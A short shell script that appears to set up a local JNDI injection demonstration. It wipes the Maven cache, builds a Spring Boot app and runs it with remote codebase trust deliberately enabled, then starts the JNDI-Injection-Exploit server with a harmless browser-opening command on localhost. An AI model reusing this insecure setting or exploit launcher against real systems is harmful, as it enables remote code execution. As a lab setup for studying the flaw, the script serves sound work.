rm -rf $HOME/.m2/repository
mvn clean package -DskipTests
java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar target/springboot-app-0.0.1-SNAPSHOT.jar &
java -jar lib/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open https://haveibeenpwned.com" -A "127.0.0.1" &
